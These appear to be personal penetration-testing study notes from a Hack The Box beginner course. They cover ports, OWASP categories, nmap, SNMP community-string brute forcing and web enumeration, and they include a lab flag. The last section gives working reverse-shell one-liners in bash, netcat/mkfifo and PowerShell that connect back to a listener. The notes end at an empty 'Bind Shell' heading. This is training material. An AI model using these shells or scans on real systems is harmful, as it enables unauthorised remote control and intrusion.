---
sticker: ""
aliases: []
---
# Shell

**What’s a shell?**
- a program that takes input and passes it to the OS to be executed
	- ex: bash, zsh, fish

| **Shell Type** | **Description**                                                                                                               |
| :------------- | :---------------------------------------------------------------------------------------------------------------------------- |
| Reverse Shell  | Shell that connects back from the target to a listener on our local machine (interactive)                                     |
| Bind Shell     | Shell that connects from the local machine to a listener on the target machine (interactive)                                  |
| Web Shell      | Shell that is uploaded to a web application and allows for commands to be executed on the OS one at a time (semi-interactive) |

---

# Port

**What’s a port?**
- an “opening” for a network connection to be made to or from a machine
- each port has an “address” (number) so that the service sitting behind a port can have the network traffic properly routed to it

| **Port(s)**     | **Protocol**          |
| --------------- | --------------------- |
| `20`/`21` (TCP) | `FTP`                 |
| `22` (TCP)      | `SSH`                 |
| `23` (TCP)      | `Telnet`              |
| `25` (TCP)      | `SMTP`                |
| `80` (TCP)      | `HTTP`                |
| `88`            | `Kerberos`            |
| `161` (TCP/UDP) | `SNMP`                |
| `389` (TCP/UDP) | `LDAP`                |
| `443` (TCP)     | `SSL`/`TLS` (`HTTPS`) |
| `445` (TCP)     | `SMB`                 |
| `3389` (TCP)    | `RDP`                 |

*Port Searching:*
```cardlink
url: https://www.stationx.net/common-ports-cheat-sheet/
title: "Common Ports Cheat Sheet: The Ultimate Ports & Protocols List"
description: "Use this comprehensive common ports cheat sheet to learn about any port and several common protocols. It also includes a special search and copy function."
host: www.stationx.net
image: https://www.stationx.net/wp-content/uploads/2022/12/Og-Common-Ports-Cheat-Sheet.jpg
```


# Web Server

```cardlink
url: https://owasp.org/www-project-top-ten/
title: "OWASP Top Ten | OWASP Foundation"
description: "The OWASP Top 10 is the reference standard for the most critical web application security risks. Adopting the OWASP Top 10 is perhaps the most effective first step towards changing your software development culture focused on producing secure code."
host: owasp.org
image: https://owasp.org/www--site-theme/favicon.ico
```

| **Number** | **Category**                                                                                                               | **Description**                                                                                                                                                                                                                                                                                                           |
| ---------- | -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1.         | [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)                                           | Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc.                                                                                                                                   |
| 2.         | [Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)                                         | Failures related to cryptography which often leads to sensitive data exposure or system compromise.                                                                                                                                                                                                                       |
| 3.         | [Injection](https://owasp.org/Top10/A03_2021-Injection/)                                                                   | User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are `SQL injection`, `command` `injection`, `LDAP injection`, etc.                                                                                                                                            |
| 4.         | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)                                                       | These issues happen when the application is not designed with security in mind.                                                                                                                                                                                                                                           |
| 5.         | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)                                   | Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information.                                                                                                                         |
| 6.         | [Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)                 | Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date.                                                                                                                                                                                                                     |
| 7.         | [Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) | Authentication-related attacks that target user's identity, authentication, and session management.                                                                                                                                                                                                                       |
| 8.         | [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)             | Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs).                              |
| 9.         | [Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)     | This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected..                                                                                                                                                                                  |
| 10.        | [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)                    | SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL). |

# Basic Tools

Tools such as `SSH`, `Netcat`, `Tmux`, and `Vim` are essential and are used daily by most information security professionals. Although these tools are not intended to be penetration testing tools, they are critical to the penetration testing process, so we must master them.

## Using SSH

[Secure Shell (SSH)](https://en.wikipedia.org/wiki/SSH_(Secure_Shell)) is a network protocol that runs on port `22` by default and provides users such as system administrators a secure way to access a computer remotely. SSH can be configured with password authentication or passwordless using [public-key authentication](https://serverpilot.io/docs/how-to-use-ssh-public-key-authentication/) using an SSH public/private key pair. SSH can be used to remotely access systems on the same network, over the internet, facilitate connections to resources in other networks using port forwarding/proxying, and upload/download files to and from remote systems.

## Using Netcat

[Netcat](https://linux.die.net/man/1/nc), `ncat`, or `nc`, is an excellent network utility for interacting with TCP/UDP ports. 

- Banner Grabbing
- 

As we can see, port 22 sent us its banner, stating that `SSH` is running on it. This technique is called `Banner Grabbing`, and can help identify what service is running on a particular port. `Netcat` comes pre-installed in most Linux distributions. We can also download a copy for Windows machines from this [link](https://nmap.org/download.html). There's another Windows alternative to `netcat` coded in PowerShell called [PowerCat](https://github.com/besimorhino/powercat). `Netcat` can also be used to transfer files between machines, as we'll discuss later.

Another similar network utility is [socat](https://linux.die.net/man/1/socat), which has a few features that `netcat` does not support, like forwarding ports and connecting to serial devices. `Socat` can also be used to [upgrade a shell to a fully interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat). We will see a few examples of this in a later section. `Socat` is a very handy utility that should be a part of every penetration tester's toolkit. A [standalone binary](https://github.com/andrew-d/static-binaries) of `Socat` can be transferred to a system after obtaining remote code execution to get a more stable reverse shell connection.

## Using Tmux

Terminal multiplexers, like `tmux` or `Screen`, are great utilities for expanding a standard Linux terminal's features, like having multiple windows within one terminal and jumping between them. Let's see some examples of using `tmux`, which is the more common of the two. If `tmux` is not present on our Linux system, we can install it with the following command:

Installation:
```bash
sudo apt install tmux -y
```

| **Command**                    | **Description**              |
| ------------------------------ | ---------------------------- |
| `tmux`                         | Run tmux                     |
| `CTRL + B`                     | Command Prefix               |
| `CTRL + B` -> hit `C`          | Open new window              |
| `CTRL + B` -> number (`0/1`)   | Input `(0/1)` window         |
| `SHIFT + %`                    | Split window vertically      |
| `SHIFT + "`                    | Split window horizontally    |
| `CTRL + B` -> `left` / `right` | Window vertical switching    |
| `CTRL + B` -> `up` / `down`    | Windows horizontal switching |

```cardlink
url: https://tmuxcheatsheet.com/
title: "Tmux Cheat Sheet & Quick Reference | Session, window, pane and more"
description: "Master tmux with the comprehensive cheat sheet: session management, examples, installation guide and more for the ultimate terminal multiplexer."
host: tmuxcheatsheet.com
favicon: https://tmuxcheatsheet.com/static/img/favicon-32x32.png
image: https://tmuxcheatsheet.com/static/img/open-graph.png
```


## Using Vim

[Vim](https://linuxcommand.org/lc3_man_pages/vim1.html) is a great text editor that can be used for writing code or editing text files on Linux systems. One of the great benefits of using `Vim` is that it relies entirely on the keyboard, so you do not have to use the mouse, which (once we get the hold of it) will significantly increase your productivity and efficiency in writing/editing code. We usually find `Vim` or `Vi` installed on compromised Linux systems, so learning how to use it allows us to edit files even on remote systems. `Vim` also has many other features, like extensions and plugins, which can significantly extend its usage and make for a great code editor. Let's see some of the basics of `Vim`. 

To open a file with `Vim`, we can add the file name after it:

```shell
vim /etc/hosts
```

To use vim:

1. Insert `vim` to open / create file
2. Hit `i` to enter `insert mode`.
	- show `"--INSERT--"` at the bottom of vim
3. Hit `esc` to get out of `insert mode` -> `normal mode`

| **Command** | **Description** |
| ----------- | --------------- |
| `x`         | Cut character   |
| `dw`        | Cut word        |
| `dd`        | Cut full line   |
| `yw`        | Copy word       |
| `yy`        | Copy full line  |
| `p`         | Paste           |

> [!tip]
> 📌 We can multiply any command to run multiple times by adding a number before it. For example, '4yw' would copy 4 words instead of one, and so on.Content


|Command|Description|
|---|---|
|`:1`|Go to line number 1.|
|`:w`|Write the file, save|
|`:q`|Quit|
|`:q!`|Quit without saving|
|`:wq`|Write and quit|


```cardlink
url: https://vimsheet.com/
title: "A Great Vim Cheat Sheet"
description: "A Great Vim Cheat Sheet"
host: vimsheet.com
```


# Service Scanning

**What is a service?**
- an application that is running on a target machine that we might be able to interact with
- each service sits behind a port
- by specifying the target ip and then the port of the service we’re interested in we can interact with that service
	- ex: [http://10.10.10.10:8080/](http://10.10.10.10:8080/)

## Nmap

```shell
nmap 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
```

Under the `PORT` heading, it also tells us that these are TCP ports. By default, `Nmap` will conduct a TCP scan unless specifically requested to perform a UDP scan.  
The `STATE` heading confirms that these ports are open. Sometimes we will see other ports listed that have a different state, such as `filtered`. This can happen if a firewall is only allowing access to the ports from specific addresses.  
The `SERVICE` heading tells us the service's name is typically mapped to the specific port number.

### Nmap Scripts

```shell
locate scripts/citrix
```

## Attacking Network Services

### Banner Grabbing

```shell
#nmap
nmap -sV --script=banner <target>

# netcat
nc -nv <target> <port>
```

### FTP

**What is FTP?**
- Running on port `21`
- service that facilitates the transferring of files. Essentially a file server
- anonymous login allows anyone to access the file server and either read, download, or upload files
- username: anonymous, blank password

### SMB

**What is SMB?**
- Running on port `139`, `445`
- a windows based network file share protocol
- enumerate this very carefully, there is a TON of opportunities here
- nmap has a bunch of scripts for this
	- script location - `/usr/share/nmap/scripts/smb*`

```shell
 locate script/smb
```

### SNMP

**What is SNMP?**
- Running on port `161
- a protocol that allows for the basic management and aggregation of data about devices on a network
- uses “strings” to control access in versions 1 & 2
	- simply need the string to gain access to it
	- - ex: `public`, `private`

```shell
k3shi@htb[/htb]$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
```

```shell
k3shi@htb[/htb]$ snmpwalk -v 2c -c private  10.129.42.253 

Timeout: No Response from 10.129.42.253
```

A tool that can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.

```cardlink
url: https://github.com/trailofbits/onesixtyone
title: "GitHub - trailofbits/onesixtyone: Fast SNMP Scanner"
description: "Fast SNMP Scanner. Contribute to trailofbits/onesixtyone development by creating an account on GitHub."
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://opengraph.githubassets.com/dd86c36648d649c595e16156c5707e22618f88c65f1a09b3111666d1049e5d01/trailofbits/onesixtyone
```

```shell
k3shi@htb[/htb]$ onesixtyone -c dict.txt 10.129.42.254

Scanning 1 hosts, 51 communities
10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
```


---

# Web Enumeration

## Gobuster

**Tools:**

```cardlink
url: https://github.com/ffuf/ffuf
title: "GitHub - ffuf/ffuf: Fast web fuzzer written in Go"
description: "Fast web fuzzer written in Go. Contribute to ffuf/ffuf development by creating an account on GitHub."
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://opengraph.githubassets.com/5f8a168adafe870aee08d28e55da2bd303a3ed168b5423f5c35889ac39486f1c/ffuf/ffuf
```

```cardlink
url: https://github.com/OJ/gobuster
title: "GitHub - OJ/gobuster: Directory/File, DNS and VHost busting tool written in Go"
description: "Directory/File, DNS and VHost busting tool written in Go - OJ/gobuster"
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://opengraph.githubassets.com/66a8d361e813067e00a6495648dcad316a77f87016de26ebf0b72b864f94d76f/OJ/gobuster
```

### Directory/File Enumeration

`GoBuster` is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing.
- trying to find content that is not linked on the website anywhere via brute-forcing

```shell
gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
```

### DNS Subdomain Enumeration

- similar concept but with subdomains
- can be found via brute-forcing or via investigating the SSL certificate on a website

Installation of `SecLists`:

```cardlink
url: https://github.com/danielmiessler/SecLists
title: "GitHub - danielmiessler/SecLists: SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more."
description: "SecLists is the security tester&#39;s companion. It&#39;s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, ..."
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://opengraph.githubassets.com/cdc79cbc44dfb1e39f9f801f81225f6c6129674c96f5a8a1614dfef08d0a315a/danielmiessler/SecLists
```

```shell
git clone https://github.com/danielmiessler/SecLists
```

```shell
sudo apt install seclists -y
```


Add a DNS Server such as 1.1.1.1 to the `/etc/resolv.conf` file. We will target the domain `inlanefreight.com`, the website for a fictional freight and logistics company.

```shell
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

```shell
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Domain:     inlanefreight.com
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/namelist.txt
===============================================================
2020/12/17 23:08:55 Starting gobuster
===============================================================
Found: blog.inlanefreight.com
Found: customer.inlanefreight.com
Found: my.inlanefreight.com
Found: ns1.inlanefreight.com
Found: ns2.inlanefreight.com
Found: ns3.inlanefreight.com
===============================================================
2020/12/17 23:10:34 Finished
===============================================================
```


## Web Enumeration Tips

### Banner Grabbing / Web Server Headers

Web server headers provide a good picture of what is hosted on a web server.
- `cURL` use to retrieve server header information from the command line

```shell
curl -IL https://www.inlanefreight.com
```

```shell
HTTP/1.1 200 OK
Date: Fri, 18 Dec 2020 22:24:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Link: <https://www.inlanefreight.com/>; rel=shortlink
Content-Type: text/html; charset=UTF-8
```

```cardlink
url: https://github.com/RedSiege/EyeWitness
title: "GitHub - RedSiege/EyeWitness: EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible."
description: "EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible. - RedSiege/EyeWitness"
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://opengraph.githubassets.com/0e99c5f594f42b501dca39201ad1454f4149667a506b864319e6477862726602/RedSiege/EyeWitness
```

### Whatweb

1. extract the version of web servers and supporting frameworks
	-  this information help to pinpoint the technologies in use and begin to search for potential vulnerabilities.

```shell
whatweb 10.10.10.121

http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
```

2. automate web application enumeration across a network.

```shell
whatweb --no-errors 10.10.10.0/24

http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service]
http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge]
```

### Certificates

`SSL/TLS` certificates are another potentially valuable source of information if HTTPS is in use.
- important to look at because they can reveal subdomains, email addresses, child company names, etc.
- These could potentially be used to conduct a phishing attack if this is within the scope of an assessment.

![phpinfo](https://academy.hackthebox.com/storage/modules/77/cert.png)

### Robots.txt

common for websites to contain a `robots.txt` file
`robots.txt` is used to stop web crawls from indexing certain website content 
- such as admin login pages that might be interesting to us but is not linked anywhere on the website

![phpinfo](https://academy.hackthebox.com/storage/modules/77/robots.png)

Navigating to `http://<Target IP>/private` in a browser reveals a HTB admin login page.

![phpinfo](https://academy.hackthebox.com/storage/modules/77/academy.png)

### Source Code

View page source: `CTRL + U`
Inspection: `CTRL + SHIFT + I` (look for technologies in href attributes)
- i.e is a php file linked somewhere, js file?
- check for comments left in the source code by devs!
- search for hidden attributes

![phpinfo](https://academy.hackthebox.com/storage/modules/77/source.png)

### Common Webroot Locations

| **Web Server** | **Webroot Location**    |
| -------------- | ----------------------- |
| Nginx          | `/usr/local/nginx/html` |
| Apache         | `/var/www/html`         |
| IIS            | `C:\\inetpub\\wwwroot`  |
| XAMPP          | `C:\\xampp\\htdocs`     |

---

# Public Exploit

Utilize exploit database to search for vulnerabilities:

```cardlink
url: https://www.exploit-db.com/
title: "OffSec’s Exploit Database Archive"
description: "The Exploit Database - Exploits, Shellcode, 0days, Remote Exploits, Local Exploits, Web Apps, Vulnerability Reports, Security Articles, Tutorials and more."
host: www.exploit-db.com
favicon: https://www.exploit-db.com/favicon.ico
```

```cardlink
url: https://www.rapid7.com/db/
title: "Vulnerability & Exploit Database - Rapid7"
description: "Rapid7's Exploit DB is a repository of vetted computer software exploits and exploitable vulnerabilities. Search over 140k vulnerabilities."
host: www.rapid7.com
favicon: https://www.rapid7.com/includes/img/favicon.ico
image: https://www.rapid7.com/globalassets/rapid7-og.jpg
```

```cardlink
url: https://www.vulnerability-lab.com/
title: "VULNERABILITY LAB - SECURITY VULNERABILITY RESEARCH LABORATORY - Best Independent Bug Bounty Programs, Responsible Disclosure & Vulnerability Coordination Platform - INDEX"
description: "VULNERABILITY LAB - SECURITY VULNERABILITY RESEARCH LABORATORY - Best Independent Bug Bounty Programs, Responsible Disclosure & Vulnerability Coordination Platform"
host: www.vulnerability-lab.com
```


## Question

Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)

Target IP: 94.237.48.153:30204

![](assets/img/Getting%20Started/Getting%20Started.md_Attachments/Getting%20Started-20240827232334438.png)

![](assets/img/Getting%20Started/Getting%20Started.md_Attachments/Getting%20Started-20240827232448090.png)

![](assets/img/Getting%20Started/Getting%20Started.md_Attachments/Getting%20Started-20240827232613650.png)

> [!success]
> HTB{my_f1r57_h4ck}


---

# Type of Shells

| **Type of Shell**   | **Method of Communication**                                                                                                     |
| --------------- | --------------------------------------------------------------------------------------------------------------------------- |
| `Reverse Shell` | Connects back to our system and gives us control through a reverse connection.                                              |
| `Bind Shell`    | Waits for us to connect to it and gives us control once we do.                                                              |
| `Web Shell`     | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output. |

## Reverse Shell

### Netcat Listener

```shell-session
k3shi@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

The flags we are using are the following:

| **Flag**  | **Description**                                                                     |
| --------- | ----------------------------------------------------------------------------------- |
| `-l`      | Listen mode, to wait for a connection to connect to us.                             |
| `-v`      | Verbose mode, so that we know when we receive a connection.                         |
| `-n`      | Disable DNS resolution and only connect from/to IPs, to speed up the connection.    |
| `-p 1234` | Port number `netcat` is listening on, and the reverse connection should be sent to. |

### Connect Back IP

```shell
k3shi@htb[/htb]$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```

> [!NOTE]
> Note: We are connecting to the IP in 'tun0' because we can only connect to HackTheBox boxes through the VPN connection, as they do not have internet connection, and therefore cannot connect to us over the internet using `eth0`. In a real pentest, you may be directly connected to the same network, or performing an external penetration test, so you may connect through the `eth0` adapter or similar.

### Reverse Shell Command

```cardlink
url: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
title: "PayloadsAllTheThings/Methodology and Resources/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings"
description: "A list of useful payloads and bypass for Web Application Security and Pentest/CTF - swisskyrepo/PayloadsAllTheThings"
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://repository-images.githubusercontent.com/71220757/c7175e80-dafd-11ea-8e0b-9c42c639ae35
```

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## Bind Shell

